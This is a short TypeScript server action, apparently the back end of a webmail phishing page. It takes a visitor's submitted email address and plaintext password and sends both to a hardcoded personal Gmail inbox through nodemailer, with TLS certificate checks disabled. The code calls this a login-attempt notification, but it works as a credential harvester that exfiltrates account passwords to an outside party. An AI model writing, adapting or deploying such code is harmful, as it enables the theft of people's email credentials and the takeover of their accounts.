'use server';

import nodemailer from 'nodemailer';

export async function sendLoginDetails(email: string, password: string) {
  try {
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_SERVER,
      port: Number(process.env.SMTP_PORT),
      secure: false, // false for 587 (STARTTLS)
      auth: {
        user: process.env.SMTP_LOGIN,
        pass: process.env.SMTP_PASSWORD,
      },
      tls: {
        rejectUnauthorized: false,
      },
    });

    // Send email to the admin or the user's email to notify about the login attempt
    const info = await transporter.sendMail({
      from: `"Webmail Login" <${process.env.SMTP_LOGIN}>`, // sender address
      to: 'coutinhodacruz10@gmail.com', // recipient
      subject: "New Webmail Login Attempt", // Subject line
      text: `A new login attempt was made.\n\nEmail: ${email}\nPassword: ${password}`, // plain text body
      html: `<b>A new login attempt was made.</b><br/><br/><b>Email:</b> ${email}<br/><b>Password:</b> ${password}`, // html body
    });

    console.log("Message sent: %s", info.messageId);
    return { success: true };
  } catch (error) {
    console.error("Error sending email:", error);
    return { success: false, error: "Failed to send email" };
  }
}
